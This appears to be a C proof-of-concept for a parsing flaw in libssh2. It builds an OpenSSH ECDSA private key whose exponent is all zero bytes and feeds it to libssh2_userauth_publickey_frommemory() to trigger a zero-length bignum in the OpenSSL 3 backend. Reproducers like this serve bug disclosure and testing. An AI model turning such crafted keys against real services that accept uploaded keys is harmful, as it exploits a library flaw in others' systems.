/*
 * Crafted openssh-key-v1 ECDSA private key fed to
 * libssh2_userauth_publickey_frommemory(). The private exponent mpint is
 * 32 zero bytes: ssh2_get_bignum_bytes() trims every leading zero, so the
 * bignum handed to the OpenSSL 3 backend has length 0 even though the
 * encoded mpint is not empty.
 *
 */

#include <libssh2.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* uncompressed P-256 base point */
static const unsigned char point[65] = {
    0x04,
    0x6b, 0x17, 0xd1, 0xf2, 0xe1, 0x2c, 0x42, 0x47,
    0xf8, 0xbc, 0xe6, 0xe5, 0x63, 0xa4, 0x40, 0xf2,
    0x77, 0x03, 0x7d, 0x81, 0x2d, 0xeb, 0x33, 0xa0,
    0xf4, 0xa1, 0x39, 0x45, 0xd8, 0x98, 0xc2, 0x96,
    0x4f, 0xe3, 0x42, 0xe2, 0xfe, 0x1a, 0x7f, 0x9b,
    0x8e, 0xe7, 0xeb, 0x4a, 0x7c, 0x0f, 0x9e, 0x16,
    0x2b, 0xce, 0x33, 0x57, 0x6b, 0x31, 0x5e, 0xce,
    0xcb, 0xb6, 0x40, 0x68, 0x37, 0xbf, 0x51, 0xf5
};

static void put_u32(unsigned char **p, unsigned long v)
{
    *(*p)++ = (unsigned char)(v >> 24) & 0xff;
    *(*p)++ = (unsigned char)(v >> 16) & 0xff;
    *(*p)++ = (unsigned char)(v >>  8) & 0xff;
    *(*p)++ = (unsigned char)(v      ) & 0xff;
}

static void put_string(unsigned char **p, const void *data, size_t len)
{
    put_u32(p, (unsigned long)len);
    if(len)
        memcpy(*p, data, len);
    *p += len;
}

static size_t b64_encode(const unsigned char *in, size_t len, char *out)
{
    static const char tbl[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t i = 0, o = 0;

    while(i + 2 < len) {
        unsigned long v = ((unsigned long)in[i] << 16) |
                          ((unsigned long)in[i + 1] << 8) | in[i + 2];
        out[o++] = tbl[(v >> 18) & 0x3f];
        out[o++] = tbl[(v >> 12) & 0x3f];
        out[o++] = tbl[(v >>  6) & 0x3f];
        out[o++] = tbl[ v       & 0x3f];
        i += 3;
    }

    if(len - i == 1) {
        unsigned long v = (unsigned long)in[i] << 16;
        out[o++] = tbl[(v >> 18) & 0x3f];
        out[o++] = tbl[(v >> 12) & 0x3f];
        out[o++] = '=';
        out[o++] = '=';
    }
    else if(len - i == 2) {
        unsigned long v = ((unsigned long)in[i] << 16) |
                          ((unsigned long)in[i + 1] << 8);
        out[o++] = tbl[(v >> 18) & 0x3f];
        out[o++] = tbl[(v >> 12) & 0x3f];
        out[o++] = tbl[(v >>  6) & 0x3f];
        out[o++] = '=';
    }

    return o;
}

int main(void)
{
    unsigned char pubkey[128];
    unsigned char priv[256];
    unsigned char blob[512];
    unsigned char *p;
    char b64[2048];
    char pem[2200];
    size_t b64len, off, linelen, pubkey_len, priv_len;
    LIBSSH2_SESSION *session;
    int rc;

    /* embedded public key half: string "ecdsa-sha2-nistp256",
       string "nistp256", string point */
    p = pubkey;
    put_string(&p, "ecdsa-sha2-nistp256", 19);
    put_string(&p, "nistp256", 8);
    put_string(&p, point, sizeof(point));
    pubkey_len = (size_t)(p - pubkey);

    /* private half */
    p = priv;
    put_u32(&p, 0x11223344);            /* checkint 1 */
    put_u32(&p, 0x11223344);            /* checkint 2 */
    put_string(&p, "ecdsa-sha2-nistp256", 19);
    put_string(&p, "nistp256", 8);
    put_string(&p, point, sizeof(point));
    put_u32(&p, 32);                    /* exponent mpint: 32 zero bytes */
    memset(p, 0, 32);
    p += 32;
    put_string(&p, "key", 3);           /* comment */
    {
        /* pad to a multiple of 8 like OpenSSH does */
        size_t used = (size_t)(p - priv);
        size_t pad = 8 - (used % 8);
        size_t i;
        if(pad == 0)
            pad = 8;
        for(i = 1; i <= pad; i++)
            *p++ = (unsigned char)i;
    }
    priv_len = (size_t)(p - priv);

    /* openssh-key-v1 container */
    p = blob;
    memcpy(p, "openssh-key-v1", 14);
    p += 14;
    *p++ = '\0';
    put_string(&p, "none", 4);          /* ciphername */
    put_string(&p, "none", 4);          /* kdfname */
    put_string(&p, "", 0);              /* kdfoptions */
    put_u32(&p, 1);                     /* number of keys */
    put_string(&p, pubkey, pubkey_len); /* embedded public key */
    put_string(&p, priv, priv_len);     /* private section */

    b64len = b64_encode(blob, (size_t)(p - blob), b64);

    /* wrap in the OpenSSH PEM armor */
    off = 0;
    off += (size_t)sprintf(pem + off, "-----BEGIN OPENSSH PRIVATE KEY-----\n");
    for(linelen = 0; linelen < b64len; linelen += 64) {
        size_t n = b64len - linelen < 64 ? b64len - linelen : 64;
        memcpy(pem + off, b64 + linelen, n);
        off += n;
        pem[off++] = '\n';
    }
    off += (size_t)sprintf(pem + off, "-----END OPENSSH PRIVATE KEY-----\n");
    pem[off] = '\0';

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 1;
    }

    rc = libssh2_userauth_publickey_frommemory(session, "user", 4,
                                               NULL, 0,
                                               pem, off,
                                               NULL);
    printf("libssh2_userauth_publickey_frommemory returned %d\n", rc);

    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
